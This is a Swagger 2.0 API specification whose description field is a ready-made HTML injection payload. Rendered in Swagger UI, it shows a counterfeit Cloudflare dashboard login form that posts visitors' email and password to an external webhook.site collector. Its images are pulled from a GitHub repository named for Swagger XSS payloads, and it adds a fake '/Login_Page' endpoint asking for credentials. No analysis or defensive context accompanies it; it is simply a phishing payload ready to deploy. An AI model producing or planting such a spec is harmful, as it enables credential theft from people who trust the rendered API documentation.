swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<table width="100%" cellspacing="0" cellpadding="12"><tr><td bgcolor="#404041" align="center"><img src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/logo-cloudflare.png" width="118" height="25" alt="Cloudflare"></td></tr></table><br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><font face="Segoe UI" size="2" color="#404041">Sign in to manage your zone configuration</font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Segoe UI" size="2" color="#333333"><b>Email address</b></font><br><input type="text" name="email" size="34" placeholder="Email address"><br><br><font face="Segoe UI" size="2" color="#333333"><b>Password</b></font><br><input type="password" name="pass" size="34" placeholder="Password"><br><br><font face="Segoe UI" size="2" color="#f6821f">Forgot your password?</font><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-cloudflare.png" width="100" height="29" alt="Log in"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#f6821f">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="1" color="#404041">Cloudflare API Dashboard &middot; Terms &middot; Privacy</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
